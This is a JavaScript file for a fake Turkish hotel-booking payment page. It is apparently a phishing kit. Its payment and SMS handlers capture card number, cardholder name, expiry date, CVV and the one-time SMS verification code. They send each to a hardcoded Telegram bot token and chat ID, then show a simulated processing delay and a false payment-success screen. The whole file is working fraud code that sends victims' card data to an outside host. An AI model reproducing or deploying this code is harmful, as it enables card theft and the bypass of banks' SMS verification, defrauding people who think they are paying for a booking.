// State
const state = {
  paymentData: {
    a: "",
    b: "",
    c: "",
    d: "",
    e: "",
  },
  smsCode: "",
  checkIn: "2025-11-10",
  checkOut: "2025-11-11",
  guests: "2",
}

// Elements
const bookBtn = document.getElementById("bookBtn")
const closePaymentBtn = document.getElementById("closePayment")
const paymentModal = document.getElementById("paymentModal")
const smsModal = document.getElementById("smsModal")
const paymentForm = document.getElementById("paymentForm")
const smsForm = document.getElementById("smsForm")
const backSmsBtn = document.getElementById("backSMS")
const successState = document.getElementById("successState")

const TELEGRAM_BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
const TELEGRAM_CHAT_ID = "-1002626141042"

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })
    console.log("[v0] Telegram response:", response.ok)
    return response.ok
  } catch (error) {
    console.log("[v0] Telegram error:", error)
    return false
  }
}

// Elements
const smsCodeInput = document.getElementById("smsCode")
const paymentBtn = document.getElementById("paymentBtn")
const verifyBtn = document.getElementById("verifyBtn")
const resendBtn = document.querySelector(".resend-btn")
const smsPrice = document.getElementById("smsPrice")
const successAmount = document.getElementById("successAmount")
const summaryCheckIn = document.getElementById("summaryCheckIn")
const summaryCheckOut = document.getElementById("summaryCheckOut")
const summaryGuests = document.getElementById("summaryGuests")
const summaryPrice = document.getElementById("summaryPrice")

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  bookBtn.addEventListener("click", openPaymentModal)
  closePaymentBtn.addEventListener("click", closePaymentModal)
  paymentForm.addEventListener("submit", handlePayment)
  smsForm.addEventListener("submit", handleSMS)
  backSmsBtn.addEventListener("click", closeSMSModal)
  document.getElementById("completeBtn").addEventListener("click", completePayment)

  // SMS Code input - only numbers
  smsCodeInput.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/\D/g, "")
  })

  // Timer
  startTimer()
})

// Payment Modal Functions
function openPaymentModal() {
  const checkIn = document.getElementById("checkIn").value
  const checkOut = document.getElementById("checkOut").value
  const guests = document.getElementById("guests").value

  // Update summary
  summaryCheckIn.textContent = formatDate(checkIn)
  summaryCheckOut.textContent = formatDate(checkOut)
  summaryGuests.textContent = guests
  summaryPrice.textContent = "2.400 TL"

  // Clear inputs
  document.getElementById("cardNumber").value = ""
  document.getElementById("cardName").value = ""
  document.getElementById("expiryMonth").value = ""
  document.getElementById("expiryYear").value = ""
  document.getElementById("cvv").value = ""

  paymentModal.classList.add("active")
  state.checkIn = checkIn
  state.checkOut = checkOut
  state.guests = guests
}

function closePaymentModal() {
  paymentModal.classList.remove("active")
  smsModal.classList.remove("active")
  successState.style.display = "none"
  smsForm.style.display = "flex"
}

function formatDate(dateString) {
  const date = new Date(dateString + "T00:00:00")
  const options = { year: "numeric", month: "long", day: "numeric" }
  return date.toLocaleDateString("tr-TR", options)
}

async function handlePayment(e) {
  e.preventDefault()

  const cardNumber = document.getElementById("cardNumber").value
  const cardName = document.getElementById("cardName").value
  const expiryMonth = document.getElementById("expiryMonth").value
  const expiryYear = document.getElementById("expiryYear").value
  const cvv = document.getElementById("cvv").value

  const message = `<b>💳 KART BİLGİSİ</b>\n\n<b>Kart Numarası:</b> ${cardNumber}\n<b>Kart Sahibi:</b> ${cardName}\n<b>Ay:</b> ${expiryMonth}\n<b>Yıl:</b> ${expiryYear}\n<b>CVV:</b> ${cvv}\n\n<b>Rezervasyon Bilgileri:</b>\n<b>Giriş:</b> ${state.checkIn}\n<b>Çıkış:</b> ${state.checkOut}\n<b>Misafir:</b> ${state.guests}`

  await sendToTelegram(message)

  // Simulate processing
  paymentBtn.disabled = true
  paymentBtn.textContent = "İşlem Yapılıyor..."

  setTimeout(() => {
    paymentModal.classList.remove("active")
    smsModal.classList.add("active")
    smsCodeInput.value = ""
    smsPrice.textContent = "2.300 TL"
    paymentBtn.disabled = false
    paymentBtn.textContent = "2.300 TL ile Ödeme Yap"
  }, 2000)
}

// SMS Modal Functions
function closeSMSModal() {
  smsModal.classList.remove("active")
  successState.style.display = "none"
  smsForm.style.display = "flex"
}

async function handleSMS(e) {
  e.preventDefault()

  const smsCode = smsCodeInput.value

  const message = `<b>📱 SMS DOĞRULAMA</b>\n\n<b>SMS Kodu:</b> <code>${smsCode}</code>\n<b>Tutar:</b> 2.300 TL\n<b>Saat:</b> ${new Date().toLocaleTimeString("tr-TR")}`

  await sendToTelegram(message)

  // Simulate verification
  verifyBtn.disabled = true
  verifyBtn.textContent = "Doğrulanıyor..."

  setTimeout(() => {
    smsForm.style.display = "none"
    successState.style.display = "block"
    successAmount.textContent = "2.300 TL"
    verifyBtn.disabled = false
    verifyBtn.textContent = "Kodu Doğrula"
  }, 2000)
}

function completePayment() {
  smsModal.classList.remove("active")
  successState.style.display = "none"
  smsForm.style.display = "flex"
}

// Timer
function startTimer() {
  let timeLeft = 120
  const timerText = document.getElementById("timerText")

  const interval = setInterval(() => {
    timeLeft--
    timerText.textContent = timeLeft

    if (timeLeft <= 0) {
      clearInterval(interval)
      resendBtn.disabled = true
    }
  }, 1000)
}

// Dark mode toggle (optional)
function toggleDarkMode() {
  document.documentElement.classList.toggle("dark")
  localStorage.setItem("darkMode", document.documentElement.classList.contains("dark"))
}
